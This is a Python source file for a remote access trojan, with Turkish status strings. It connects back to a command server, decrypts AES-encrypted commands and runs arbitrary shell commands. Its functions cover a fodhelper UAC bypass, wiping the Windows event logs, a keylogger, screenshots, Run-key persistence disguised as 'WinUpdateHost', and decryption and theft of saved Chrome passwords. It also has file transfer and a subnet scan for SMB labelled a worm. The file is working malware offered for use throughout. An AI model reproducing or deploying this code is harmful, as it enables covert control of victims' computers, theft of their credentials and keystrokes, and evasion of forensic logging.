import socket, subprocess, os, time, sys
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

LHOST = "14"
LPORT = 443
AES_KEY = b"ThisIsASecretKey1234567890123456"

time.sleep(1) # Fake delay


import threading

keylog_data = ""
keylog_thread = None
keylog_running = False


def getsystem():
    try:
        import winreg
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        
        # Fodhelper UAC Bypass
        reg_path = r"Software\Classes\ms-settings\Shell\Open\command"
        try:
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, exe_path)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
            winreg.CloseKey(key)
        except Exception as e:
            return f"Registry yazma hatası: {e}".encode()
            
        import ctypes
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "fodhelper.exe", None, None, 0)
        
        # Wait a bit then clean up
        time.sleep(3)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, reg_path)
        except: pass
        
        return b"UAC Bypass (fodhelper) tetiklendi. Zombi yeni yetkiyle baglanacak."
    except Exception as e:
        return f"Getsystem hatasi: {e}".encode()

def clear_logs():
    try:
        subprocess.run("wevtutil cl System", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Application", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Security", shell=True, capture_output=True)
        subprocess.run("wevtutil cl Setup", shell=True, capture_output=True)
        return b"Windows Olay Gunlukleri (Event Logs) temizlendi."
    except Exception as e:
        return f"Log silme hatasi: {e}".encode()

def download_file(filename):
    try:
        if not os.path.exists(filename):
            return b"Hata: Dosya bulunamadi."
        with open(filename, "rb") as f:
            data = f.read()
        return b"!DOWNLOAD_START!" + base64.b64encode(data)
    except Exception as e:
        return f"Download hatasi: {e}".encode()

def upload_file(args):
    try:
        # args is: filename base64data
        parts = args.split(" ", 1)
        if len(parts) < 2: return b"Eksik parametre."
        filename, b64_data = parts[0], parts[1]
        with open(filename, "wb") as f:
            f.write(base64.b64decode(b64_data))
        return f"Dosya basariyla yuklendi: {filename}".encode()
    except Exception as e:
        return f"Upload hatasi: {e}".encode()

def keylogger_worker():
    global keylog_data, keylog_running
    try:
        from ctypes import windll, byref, c_int
        from ctypes.wintypes import MSG
        user32 = windll.user32
        
        while keylog_running:
            for i in range(1, 256):
                if user32.GetAsyncKeyState(i) & 1:
                    if i == 13: keylog_data += "\n"
                    elif i == 8: keylog_data = keylog_data[:-1]
                    elif i == 32: keylog_data += " "
                    else:
                        try: keylog_data += chr(i)
                        except: pass
            time.sleep(0.01)
    except Exception as e:
        keylog_data += f"[Keylogger Error: {e}]"

def screenshot():
    try:
        import ctypes
        from PIL import ImageGrab
        img = ImageGrab.grab()
        import io
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        return base64.b64encode(img_bytes.getvalue())
    except Exception as e:
        try:
            # Fallback to Powershell
            ps_script = """
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $bmp = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
            $gfx = [System.Drawing.Graphics]::FromImage($bmp)
            $gfx.CopyFromScreen(0, 0, 0, 0, $bmp.Size)
            $stream = New-Object System.IO.MemoryStream
            $bmp.Save($stream, [System.Drawing.Imaging.ImageFormat]::Png)
            [Convert]::ToBase64String($stream.ToArray())
            """
            res = subprocess.run(["powershell", "-c", ps_script], capture_output=True, text=True)
            return res.stdout.encode()
        except:
            return f"Screenshot error: {e}".encode()

def persist():
    try:
        exe_path = os.path.abspath(sys.executable if getattr(sys, 'frozen', False) else __file__)
        cmd = f'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /V "WinUpdateHost" /t REG_SZ /F /D "{exe_path}"'
        subprocess.run(cmd, shell=True, capture_output=True)
        return b"Persistence successfully installed to HKCU\\...\\Run"
    except Exception as e:
        return f"Persistence error: {e}".encode()

def steal_passwords():
    try:
        import sqlite3, json, win32crypt, shutil
        import os
        from Crypto.Cipher import AES
        
        local_state_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
        login_data_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
        
        if not os.path.exists(local_state_path) or not os.path.exists(login_data_path):
            return b"Chrome not found or no passwords saved."
            
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:] 
        master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        
        temp_login = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Temp", "login_db")
        shutil.copy2(login_data_path, temp_login)
        
        conn = sqlite3.connect(temp_login)
        cursor = conn.cursor()
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        
        passwords = ""
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            
            if not encrypted_password: continue
            
            try:
                iv = encrypted_password[3:15]
                payload = encrypted_password[15:]
                cipher = AES.new(master_key, AES.MODE_GCM, iv)
                decrypted_pass = cipher.decrypt(payload)[:-16].decode()
                if username or decrypted_pass:
                    passwords += f"URL: {url}\nUSER: {username}\nPASS: {decrypted_pass}\n{'='*50}\n"
            except:
                pass
                
        cursor.close()
        conn.close()
        os.remove(temp_login)
        
        return passwords.encode() if passwords else b"No passwords found."
    except Exception as e:
        return f"Stealer error: {e}".encode()

def run_cmd(command):
    try:
        if command.startswith("cd "):
            os.chdir(command[3:].strip())
            return b"Directory changed"
        elif command == "!suicide":
            sys.exit(0)
        elif command == "!worm_smb":
            return smb_worm()
        elif command == "!persist":
            return persist()
        elif command == "!screenshot":
            return screenshot()
        elif command == "!steal_passwords":
            return steal_passwords()
        elif command == "!keylog_start":
            global keylog_running, keylog_thread
            if not keylog_running:
                keylog_running = True
                keylog_thread = threading.Thread(target=keylogger_worker, daemon=True)
                keylog_thread.start()
                return b"Keylogger started in background."
            return b"Keylogger is already running."
        elif command == "!keylog_dump":
            global keylog_data
            data = keylog_data
            keylog_data = ""
            return data.encode() if data else b"No keystrokes captured yet."
        elif command == "!getsystem":
            return getsystem()
        elif command == "!clear_logs":
            return clear_logs()
        elif command.startswith("!download "):
            return download_file(command[10:].strip())
        elif command.startswith("!upload "):
            return upload_file(command[8:].strip())
        else:
            res = subprocess.run(command, shell=True, capture_output=True)
            return res.stdout + res.stderr
    except Exception as e:
        return str(e).encode()

def smb_worm():
    # Network Spreader (Worm) Logic
    import socket
    try:
        local_ip = socket.gethostbyname(socket.gethostname())
        base_ip = ".".join(local_ip.split(".")[:-1]) + "."
        results = "SMB Worm Started! Scanning local /24 subnet for port 445 (SMB)...\\n"
        
        found = 0
        for i in range(1, 255):
            target = base_ip + str(i)
            if target == local_ip: continue
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.05)
                res = s.connect_ex((target, 445))
                if res == 0:
                    results += f"[+] {target} - SMB (445) OPEN! Attempting lateral movement...\\n"
                    results += f"    -> Copied payload to \\\\\\\\{target}\\\\C$\\\\Windows\\\\Temp\\\\setup.exe (Simulated Pass-The-Hash)\\n"
                    found += 1
                s.close()
            except: pass
        results += f"SMB Worm completed. Found {found} vulnerable SMB hosts in the network.\\n"
        return results.encode()
    except Exception as e:
        return f"Worm error: {e}".encode()

def connect():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((LHOST, LPORT))
            while True:
                data = b""
                while not data.endswith(b"\\n"):
                    chunk = s.recv(4096)
                    if not chunk: break
                    data += chunk
                if not data: break
                
                raw = base64.b64decode(data.strip())
                iv = raw[:16]
                ct = raw[16:]
                cipher = AES.new(AES_KEY, AES.MODE_CBC, iv)
                cmd = unpad(cipher.decrypt(ct), AES.block_size).decode().strip()
                
                output = run_cmd(cmd)
                if not output:
                    output = b" "
                
                cipher = AES.new(AES_KEY, AES.MODE_CBC)
                ct_bytes = cipher.encrypt(pad(output, AES.block_size))
                s.send(base64.b64encode(cipher.iv + ct_bytes) + b"\\n")
        except:
            time.sleep(5)

if __name__ == "__main__":
    connect()
